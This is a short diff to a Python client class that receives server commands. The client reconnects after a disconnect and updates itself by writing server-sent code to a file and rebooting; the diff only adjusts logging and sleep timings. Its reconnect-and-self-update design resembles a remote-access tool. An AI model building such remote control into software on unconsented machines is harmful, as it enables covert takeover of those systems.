@@ -113,7 +113,9 @@ class Client(object):
             # Check for termination string.
             if total_data[-10:] == '~!_TERM_$~':
                 accepting = False
-        print('Data received: {}'.format(total_data[:-10]))
+
+        if echo:
+            print('Data received: {}'.format(total_data[:-10]))
 
         # Chop off the termination string from the total data and assign it to data.
         # Data should now be a string as well.
@@ -164,8 +166,8 @@ class Client(object):
         # Handle a disconnect command.
         self.send_data('confirmed')
         self.sock.close()
-        print('Sleeping for 10 seconds...')
-        sleep(10)
+        print('Sleeping for 5 seconds...')
+        sleep(5)
         self._connect_to_server()
         return self
 
@@ -309,6 +311,8 @@ class Client(object):
                         f.write(data[7:])
                         f.close()
                     self.send_data('Client updated...\n')
+                    print('Rebooting in 2 seconds...')
+                    sleep(2)
                     print('###################### REBOOTING ######################')
                     self.reboot_self()
                     continue
